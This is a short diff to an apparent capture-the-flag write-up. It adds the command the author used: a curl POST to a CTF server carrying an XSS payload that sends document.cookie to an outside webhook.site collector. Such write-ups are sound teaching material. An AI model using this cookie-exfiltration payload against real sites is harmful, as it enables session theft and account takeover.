@@ -86,7 +86,10 @@ same procedure as images above which is to throw into cyberchef and look at the 
 which led to this : 
 
 * Nice another webpage and it seems to be doing a POST request with a certain field.
-* 
+commands used
+```
+curl -X POST "http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/xcvlosxgbtfcofovywbxdawregjbzqta.php" -d "14c4b06b824ec593239362517f538b29=<script>document.write('<img src="https://webhook.site/694ffb57-9ed8-4db2-86ae-5463fea3af0b?c='%2bdocument.cookie%2b'" />');</script>
+```
 
 
 
